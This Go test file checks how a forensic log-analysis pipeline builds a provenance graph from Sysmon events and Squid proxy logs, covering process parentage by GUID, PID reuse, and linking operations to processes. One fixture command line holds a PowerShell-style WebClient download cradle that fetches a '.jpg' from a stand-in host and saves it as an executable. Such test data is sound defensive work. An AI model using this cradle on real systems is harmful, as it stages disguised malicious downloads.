// in-package test: Sysmon のイベントから組んだグラフのノードとエッジと根拠の位置を確かめる。
package pipeline

import (
	"slices"
	"strings"
	"testing"

	"github.com/Intellectual-Chasen/Oraculum/backend/core"
)

// sysmonEventXML は Sysmon のイベント 1 件を返す。data は Name と値の組を交互に並べる。
func sysmonEventXML(recordID, eventID string, data ...string) string {
	var elements strings.Builder
	for at := 0; at+1 < len(data); at += 2 {
		elements.WriteString(`<Data Name="` + data[at] + `">` + data[at+1] + `</Data>`)
	}
	return `<Event><System><Provider Name="Microsoft-Windows-Sysmon"/><EventID>` + eventID + `</EventID>` +
		`<TimeCreated SystemTime="2001-02-03T04:05:` + recordID + `.5Z"/><EventRecordID>` + recordID +
		`</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel>` +
		`<Computer>host-s.example.test</Computer></System><EventData>` + elements.String() + `</EventData></Event>` + "\n"
}

// GUID。どれも Sysmon の GUID の形を持つ値である。
const (
	sysmonRootGuid      = "{0A1B2C3D-0002-4000-8000-0000000000F0}"
	sysmonParentGuid    = "{0A1B2C3D-0002-4000-8000-0000000000A1}"
	sysmonChildGuid     = "{0A1B2C3D-0002-4000-8000-0000000000C1}"
	sysmonReusedGuid    = "{0A1B2C3D-0002-4000-8000-0000000000B1}"
	sysmonLateChildGuid = "{0A1B2C3D-0002-4000-8000-0000000000C2}"
)

func sysmonCreateXML(recordID, guid, pid, image, parentGuid, parentPid, parentImage string) string {
	return sysmonEventXML(recordID, "1", "UtcTime", "2001-02-03 04:05:"+recordID+".100",
		"ProcessGuid", guid, "ProcessId", pid, "Image", image, "CommandLine", image,
		"ParentProcessGuid", parentGuid, "ParentProcessId", parentPid, "ParentImage", parentImage)
}

func sysmonOperationXML(recordID, eventID, guid, pid, image string, data ...string) string {
	return sysmonEventXML(recordID, eventID, append([]string{"UtcTime", "2001-02-03 04:05:" + recordID + ".100",
		"ProcessGuid", guid, "ProcessId", pid, "Image", image}, data...)...)
}

// sysmonEvents は 1 つの file に並べるイベントと、各イベントの記録番号である。
//
// parent.exe の親は file に生成の記録を持たない。reused.exe は parent.exe と同じプロセス番号を
// 持ち、親は全桁 0 の GUID である。late-child.exe は reused.exe の起動の後に、番号では
// reused.exe、GUID では parent.exe を親として指す。
var sysmonEvents = []struct {
	recordID string
	xml      string
}{
	{"11", sysmonCreateXML("11", sysmonParentGuid, "31", `C:\Example\parent.exe`, sysmonRootGuid, "4", `C:\Example\root.exe`)},
	{"12", sysmonCreateXML("12", sysmonChildGuid, "41", `C:\Example\child.exe`, sysmonParentGuid, "31", `C:\Example\parent.exe`)},
	{"13", sysmonCreateXML("13", sysmonReusedGuid, "31", `C:\Example\reused.exe`,
		"{00000000-0000-0000-0000-000000000000}", "0", "-")},
	{"14", sysmonCreateXML("14", sysmonLateChildGuid, "51", `C:\Example\late-child.exe`, sysmonParentGuid, "31", `C:\Example\parent.exe`)},
	{"15", sysmonOperationXML("15", "11", sysmonChildGuid, "41", `C:\Example\child.exe`,
		"TargetFilename", `C:\Example\created.txt`, "CreationUtcTime", "2001-02-03 04:05:15.100")},
	{"16", sysmonOperationXML("16", "13", sysmonChildGuid, "41", `C:\Example\child.exe`,
		"EventType", "SetValue", "TargetObject", `HKU\Example\Run\Value1`, "Details", "example data")},
	{"17", sysmonOperationXML("17", "3", sysmonChildGuid, "41", `C:\Example\child.exe`,
		"Protocol", "tcp", "Initiated", "true", "SourceIp", "192.0.2.17", "SourcePort", "50017",
		"DestinationIp", "198.51.100.17", "DestinationHostname", "dest17.example.test", "DestinationPort", "8017")},
	{"18", sysmonOperationXML("18", "2", sysmonLateChildGuid, "51", `C:\Example\late-child.exe`,
		"TargetFilename", `C:\Example\touched.txt`, "CreationUtcTime", "2000-01-02 03:04:05.600")},
	// 着信の通信。Destination は自分の端末であり、Source が相手である。
	{"19", sysmonOperationXML("19", "3", sysmonChildGuid, "41", `C:\Example\child.exe`,
		"Protocol", "tcp", "Initiated", "false", "SourceIp", "203.0.113.19", "SourcePort", "50019",
		"DestinationIp", "192.0.2.19", "DestinationHostname", "host-s.example.test", "DestinationPort", "8019")},
	// GUID を持たない起動と操作。番号は child.exe の番号を親として指し、操作は同じ番号で続く。
	{"20", sysmonCreateXML("20", "{00000000-0000-0000-0000-000000000000}", "61", `C:\Example\no-guid.exe`,
		"-", "41", `C:\Example\child.exe`)},
	{"21", sysmonOperationXML("21", "3", "-", "61", `C:\Example\no-guid.exe`,
		"Protocol", "tcp", "Initiated", "true", "DestinationIp", "198.51.100.21", "DestinationPort", "8021")},
}

// sysmonDocument は sysmonEvents を並べた file と、記録番号ごとのイベントの開始位置である。
func sysmonDocument() (string, map[string]int64) {
	var document strings.Builder
	document.WriteString("<Events>\n")
	offsets := make(map[string]int64, len(sysmonEvents))
	for _, event := range sysmonEvents {
		offsets[event.recordID] = int64(document.Len())
		document.WriteString(event.xml)
	}
	document.WriteString("</Events>\n")
	return document.String(), offsets
}

// nodeWithIdentity は、識別鍵に value を持つ kind のノードの位置を返す。
func nodeWithIdentity(t *testing.T, graph Graph, kind core.NodeKind, value string) int {
	t.Helper()
	for at, node := range graph.nodes {
		if node.key.Kind != kind {
			continue
		}
		for _, identity := range node.key.Values {
			if identity.Value == value || kind == core.NodeKindFile && identity.Value == core.FilePathKeyValue(value) {
				return at
			}
		}
	}
	t.Fatalf("the graph holds no %s node identified by %q", kind, value)
	return -1
}

// requireEdgeFromRecord は、種別と両端が一致するエッジが、記録番号のイベントの位置を根拠に
// 持つことを確かめる。
func requireEdgeFromRecord(
	t *testing.T, graph Graph, kind core.EdgeKind, source, target int, offsets map[string]int64, recordID string,
) {
	t.Helper()
	for _, edge := range graph.edges {
		if edge.kind != kind || edge.source != source || edge.target != target {
			continue
		}
		for _, at := range edge.evidence {
			if offset := graph.records[at].locator.ByteOffset; offset != nil && *offset == offsets[recordID] {
				return
			}
		}
		t.Errorf("the %s edge has no evidence at the event %s (byte %d)", kind, recordID, offsets[recordID])
		return
	}
	t.Errorf("the graph has no %s edge from %d to %d", kind, source, target)
}

// GUID で親子を結ぶ。プロセス番号の再利用に惑わされず、親の生成の記録が無い親は参照だけの
// ノードとして保ち、全桁 0 の GUID から親を作らない。
func TestSysmonGraphLinksProcessesByGuid(t *testing.T) {
	document, offsets := sysmonDocument()
	graph := NewGraph(windowsEventImportResult(t, document), AllMatchConditions())
	parentAt := processNodeLabelled(t, graph, `C:\Example\parent.exe`)
	childAt := processNodeLabelled(t, graph, `C:\Example\child.exe`)
	reusedAt := processNodeLabelled(t, graph, `C:\Example\reused.exe`)
	lateChildAt := processNodeLabelled(t, graph, `C:\Example\late-child.exe`)
	rootAt := processNodeLabelled(t, graph, `C:\Example\root.exe`)

	requireEdgeFromRecord(t, graph, core.EdgeKindProcessParentChild, parentAt, childAt, offsets, "12")
	requireEdgeFromRecord(t, graph, core.EdgeKindProcessParentChild, parentAt, lateChildAt, offsets, "14")
	requireEdgeFromRecord(t, graph, core.EdgeKindProcessParentChild, rootAt, parentAt, offsets, "11")
	if hasEdge(graph, core.EdgeKindProcessParentChild, reusedAt, lateChildAt) {
		t.Error("the parent was chosen by the reused process number")
	}
	for _, edge := range lineageParentChildEdges(graph) {
		if edge.target == reusedAt {
			t.Errorf("the process with the all-zero parent GUID has the parent %+v", graph.nodes[edge.source].key)
		}
	}
	for _, at := range []int{parentAt, childAt, reusedAt, lateChildAt} {
		if node := graph.nodes[at]; node.observation != core.NodeObservationObserved || len(node.creationRecords) == 0 {
			t.Errorf("%+v is %s with %d creation records, want observed with one", node.key, node.observation,
				len(node.creationRecords))
		}
	}
	// 生成の記録が無い親は、子の生成が参照しただけのノードであり、生成の記録を持たない。
	if root := graph.nodes[rootAt]; root.observation != core.NodeObservationReferenced || len(root.creationRecords) != 0 {
		t.Errorf("the parent without a creation record is %s with %d creation records", root.observation,
			len(root.creationRecords))
	}
	for _, node := range graph.nodes {
		if node.key.Form == core.NodeKeyFormTerminalProcessInterval {
			t.Errorf("a Sysmon record built the process-number node %+v", node.key)
		}
		for _, identity := range node.key.Values {
			if node.key.Kind == core.NodeKindProcess && identity.Semantic == core.SemanticKeyProcessId &&
				!strings.HasPrefix(identity.Value, "{0A1B2C3D-") {
				t.Errorf("a process node is identified by %q", identity.Value)
			}
		}
	}
}

// ファイル・レジストリ・通信のイベントは、操作したプロセスからの既存の関係を張り、関係は元の
// イベントの位置を根拠に持つ。
func TestSysmonGraphLinksOperationsToTheProcess(t *testing.T) {
	document, offsets := sysmonDocument()
	graph := NewGraph(windowsEventImportResult(t, document), AllMatchConditions())
	childAt := processNodeLabelled(t, graph, `C:\Example\child.exe`)
	lateChildAt := processNodeLabelled(t, graph, `C:\Example\late-child.exe`)
	for _, item := range []struct {
		kind     core.EdgeKind
		source   int
		node     core.NodeKind
		value    string
		recordID string
	}{
		{core.EdgeKindFileOperation, childAt, core.NodeKindFile, `C:\Example\created.txt`, "15"},
		{core.EdgeKindRegistryOperation, childAt, core.NodeKindRegistryValue, `HKU\Example\Run\Value1`, "16"},
		{core.EdgeKindProcessCommunication, childAt, core.NodeKindIp, "198.51.100.17", "17"},
		{core.EdgeKindReverseLookupName, childAt, core.NodeKindDomain, "dest17.example.test", "17"},
		{core.EdgeKindFileOperation, lateChildAt, core.NodeKindFile, `C:\Example\touched.txt`, "18"},
	} {
		requireEdgeFromRecord(t, graph, item.kind, item.source, nodeWithIdentity(t, graph, item.node, item.value),
			offsets, item.recordID)
	}
	// 逆引きの名前は IP の持ち主が決めるため、プロセスの通信の相手として確定しない。関係は候補
	// だけであり、名前のノードは参照だけのノードである。
	domainAt := nodeWithIdentity(t, graph, core.NodeKindDomain, "dest17.example.test")
	if graph.nodes[domainAt].observation != core.NodeObservationReferenced {
		t.Errorf("the reverse lookup name is %s, want referenced", graph.nodes[domainAt].observation)
	}
	for _, edge := range graph.edges {
		if edge.target != domainAt {
			continue
		}
		if edge.kind != core.EdgeKindReverseLookupName || edge.state != core.RelationStateCandidate {
			t.Errorf("the reverse lookup name has the %s %s edge, want only the candidate %s edge",
				edge.state, edge.kind, core.EdgeKindReverseLookupName)
		}
	}
	// 操作のイベントはプロセスの生成を記録しない。
	if records := graph.nodes[childAt].creationRecords; len(records) != 1 ||
		*graph.records[records[0]].locator.ByteOffset != offsets["12"] {
		t.Errorf("the child carries the creation records %v, want only the event 12", records)
	}
}

// 別の収集元が要求したホスト名のノードが同じ名前で既にあるときは、逆引きの名前の候補をその
// ノードへ張る。ノードは 1 つのままで、状態と根拠は要求を記録したレコードのものを保つ。
func TestSysmonReverseLookupNameJoinsTheRequestedHostname(t *testing.T) {
	document, offsets := sysmonDocument()
	events := scanIndexSource(t, NewTestParser(WindowsEventXMLFormatKey, nil),
		"events-1.xml", WindowsEventXMLFormatKey, document)
	proxy := scanIndexSource(t, NewTestParser(SquidFormatKey, nil), "access.log", SquidFormatKey,
		`192.0.2.30 - - [01/Feb/2000:13:00:08 +0900] "GET http://dest17.example.test/ HTTP/1.1" 200 12 "-" "test" TCP_MISS:DIRECT`+"\n")
	result, err := newImportResult([]scannedSource{events, proxy},
		[]core.ImportStatus{settleStatus(t, events, "winevent-1"), settleStatus(t, proxy, "squid-1")},
		"run", indexRawTextRef)
	if err != nil {
		t.Fatal(err)
	}
	graph := NewGraph(result, AllMatchConditions())
	domains := 0
	for _, node := range graph.nodes {
		if node.key.Kind == core.NodeKindDomain && node.key.Values[0].Value == "dest17.example.test" {
			domains++
		}
	}
	if domains != 1 {
		t.Fatalf("the graph holds %d nodes of the name, want the requested hostname only", domains)
	}
	domainAt := nodeWithIdentity(t, graph, core.NodeKindDomain, "dest17.example.test")
	domain := graph.nodes[domainAt]
	if domain.observation != core.NodeObservationObserved {
		t.Errorf("the requested hostname is %s, want observed", domain.observation)
	}
	for _, at := range domain.evidence {
		if name := graph.records[at].locator.SourceFileName; name != "access.log" {
			t.Errorf("the requested hostname carries the evidence of %s, want only the proxy record", name)
		}
	}
	requireEdgeFromRecord(t, graph, core.EdgeKindReverseLookupName,
		processNodeLabelled(t, graph, `C:\Example\child.exe`), domainAt, offsets, "17")
}

// プロセスの引数の URL から導いた host と、Proxy のレコードの要求先の host は、同じドメインの
// ノード 1 つになる。引数の候補と Proxy のレコードの関係は、どちらもそのノードを端に持つ。
func TestArgumentHostAndProxyRequestShareOneDomainNode(t *testing.T) {
	const host = "dl.example.test"
	document := "<Events>\n" + sysmonEventXML("11", "1", "UtcTime", "2001-02-03 04:05:11.100",
		"ProcessGuid", sysmonChildGuid, "ProcessId", "41", "Image", `C:\Example\ps.exe`,
		"CommandLine", `ps.exe -c (New-Object Net.WebClient).DownloadFile('http://`+host+`/a.jpg','C:\Example\a.exe')`,
		"ParentProcessGuid", sysmonParentGuid, "ParentProcessId", "31", "ParentImage", `C:\Example\parent.exe`) +
		"</Events>\n"
	result := sessionSourcesResult(t,
		sessionSource{name: "events-1.xml", format: WindowsEventXMLFormatKey, document: document},
		sessionSource{name: "access.log", format: SquidFormatKey,
			document: `192.0.2.30 - - [03/Feb/2001:13:05:12 +0900] "GET http://` + host + `/a.jpg HTTP/1.1" 200 12 "-" "-" TCP_MISS:DIRECT` + "\n"})
	graph := NewGraph(result, AllMatchConditions())
	domains := 0
	for _, node := range graph.nodes {
		if node.key.Kind == core.NodeKindDomain && slices.ContainsFunc(node.key.Values,
			func(value core.NodeIdentityValue) bool { return value.Value == host }) {
			domains++
		}
	}
	if domains != 1 {
		t.Fatalf("the graph holds %d domain nodes of the host, want one", domains)
	}
	domainAt := nodeWithIdentity(t, graph, core.NodeKindDomain, host)
	process := processNodeLabelled(t, graph, `C:\Example\ps.exe`)
	if !slices.Contains(edgePairsOfKind(graph, core.EdgeKindArgumentNamesObject), [2]int{process, domainAt}) {
		t.Error("the process does not name the domain node by its argument")
	}
	var proxyRecord bool
	for _, edge := range graph.edges {
		if edge.kind == core.EdgeKindRecordNamesObject && edge.target == domainAt &&
			graph.records[edge.evidence[0]].locator.SourceFileName == "access.log" {
			proxyRecord = true
		}
	}
	if !proxyRecord {
		t.Error("the proxy record does not name the domain node")
	}
}

// 着信の通信から、自分の端末のアドレスとホスト名への関係も、相手のアドレスのノードも作らない。
func TestSysmonGraphLeavesAnInboundConnectionUnlinked(t *testing.T) {
	document, offsets := sysmonDocument()
	graph := NewGraph(windowsEventImportResult(t, document), AllMatchConditions())
	for _, node := range graph.nodes {
		for _, identity := range node.key.Values {
			if (node.key.Kind == core.NodeKindIp || node.key.Kind == core.NodeKindDomain) &&
				(identity.Value == "203.0.113.19" || identity.Value == "192.0.2.19" || identity.Value == "host-s.example.test") {
				t.Errorf("the inbound connection built the %s node %q", node.key.Kind, identity.Value)
			}
		}
	}
	for _, edge := range graph.edges {
		if edge.kind != core.EdgeKindProcessCommunication {
			continue
		}
		for _, at := range edge.evidence {
			if offset := graph.records[at].locator.ByteOffset; offset != nil && *offset == offsets["19"] {
				t.Errorf("the inbound connection is the evidence of the edge to %+v", graph.nodes[edge.target].key)
			}
		}
	}
}

// GUID を持たない Sysmon のレコードは、プロセス番号からプロセスのノードも親子の候補も作らない。
// 番号の再利用を区切る根拠を Sysmon のレコードは GUID で持つためである。
func TestSysmonGraphKeepsRecordsWithoutGuidOffProcessNumbers(t *testing.T) {
	document, _ := sysmonDocument()
	graph := NewGraph(windowsEventImportResult(t, document), AllMatchConditions())
	for _, node := range graph.nodes {
		if raw, _ := node.label.RawTextValue(); node.key.Kind == core.NodeKindProcess && raw == `C:\Example\no-guid.exe` {
			t.Errorf("the record without a GUID built the process node %+v", node.key)
		}
	}
	for _, edge := range lineageParentChildEdges(graph) {
		if edge.state != core.RelationStateObserved {
			t.Errorf("the graph holds the parent-child candidate %s", edge.id)
		}
	}
}

// プロセス番号の区間の経路から外すのは、process.id の項目を持つレコードである。値の状態を
// 問わない。markii 形式の psGUID が値の不在 ("-") のレコードは外れ、psGUID の key を持たない
// レコードは番号の区間のプロセスになる。
func TestProcessNumberPathSkipsRecordsCarryingAProcessIdItem(t *testing.T) {
	document := `01/02/2024 03:04:05.006 +0000 sn=21 evt=file subEvt=create psGUID="-" psID=12 tmid=t path=x.txt` + "\n" +
		`01/02/2024 03:04:06.006 +0000 sn=22 evt=file subEvt=create psID=13 tmid=t path=y.txt` + "\n"
	scanned := scanIndexSource(t, NewTestParser(MarkIIFormatKey, nil), "client.log", MarkIIFormatKey, document)
	result, err := newImportResult([]scannedSource{scanned},
		[]core.ImportStatus{settleStatus(t, scanned, "markii")}, "run", indexRawTextRef)
	if err != nil {
		t.Fatal(err)
	}
	graph := NewGraph(result, AllMatchConditions())
	if nodes := processNodesOfPid(t, graph, "12"); len(nodes) != 0 {
		t.Errorf("the record with an absent psGUID built the process-number nodes %v", nodes)
	}
	if nodes := processNodesOfPid(t, graph, "13"); len(nodes) != 1 {
		t.Errorf("the record without psGUID built the process-number nodes %v, want one", nodes)
	}
}
